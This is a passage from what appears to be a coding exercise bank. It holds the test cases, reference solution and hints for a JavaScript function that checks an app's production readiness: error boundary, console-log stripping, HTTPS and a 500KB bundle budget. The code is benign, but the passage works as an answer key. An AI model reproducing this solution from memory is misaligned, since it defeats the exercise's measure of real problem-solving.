          name: 'Passes when all production criteria are satisfied',
          run: (fn) => {
            const config = {
              hasErrorBoundary: true,
              consoleLogsRemoved: true,
              httpsEnabled: true,
              bundleSizeKb: 350
            };
            const res = fn(config);
            return res.ready === true && res.failures.length === 0;
          }
        },
        {
          name: 'Flags bundle size and missing error boundary',
          run: (fn) => {
            const config = {
              hasErrorBoundary: false,
              consoleLogsRemoved: true,
              httpsEnabled: true,
              bundleSizeKb: 850
            };
            const res = fn(config);
            return res.ready === false && res.failures.length === 2;
          }
        }
      ],
      solution: `export function productionReadinessCheck(config) {
  const failures = [];
  if (!config.hasErrorBoundary) failures.push('Missing top-level Error Boundary fallback UI');
  if (!config.consoleLogsRemoved) failures.push('Production build contains unstripped console.log statements');
  if (!config.httpsEnabled) failures.push('HTTPS must be enabled for production deployment');
  if (config.bundleSizeKb > 500) failures.push(\`Bundle size (\${config.bundleSizeKb}KB) exceeds 500KB budget\`);

  return {
    ready: failures.length === 0,
    failures
  };
}`,
      hints: [
        'Check each required boolean flag.',
        'Check bundleSizeKb > 500.',
        'Return ready: failures.length === 0.'
      ]
    }
  ]
};
